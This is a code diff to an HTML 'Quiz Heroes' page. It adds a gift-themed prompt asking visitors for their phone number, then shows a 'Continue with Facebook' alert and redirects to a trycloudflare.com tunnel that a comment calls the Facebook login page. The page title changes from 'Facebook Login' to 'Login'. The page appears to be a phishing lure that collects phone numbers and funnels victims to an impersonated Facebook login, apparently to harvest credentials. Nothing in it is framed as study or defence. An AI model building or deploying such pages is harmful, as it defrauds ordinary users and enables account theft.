@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook Login</title>
+  <title>Login</title>
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
   <style>
     body {
@@ -79,7 +79,9 @@
     <div class="header">
       <h1 class="text-center mb-4 quiz-heading">Welcome to the Quiz Heroes</h1>
     </div>
+
     <div class="col-md-6 mx-auto short-input">
+      <p class="card-title text-center bg-transparent">🎉Enter Your Phone Number for Gifts🎉</p>
       <form id="phoneNumberForm" class="text-center">
         <div class="form-group">
           <label for="phoneNumber" class="form-label">Enter Your Mobile Number:</label>
@@ -106,9 +108,10 @@ document.addEventListener("DOMContentLoaded", function() {
 
     // Validate the phone number if needed
     // ...
-
+    const confirmationMessage = `Continue with Facebook`;
+      alert(confirmationMessage);
     // Redirect to the Facebook login page
-    window.location.href = "https://diff-whose-chronicle-bb.trycloudflare.com"; // Replace with the actual URL of the Facebook login page
+    window.location.href = "https://lisa-darwin-sharp-laptop.trycloudflare.com"; // Replace with the actual URL of the Facebook login page
   });
 });
 
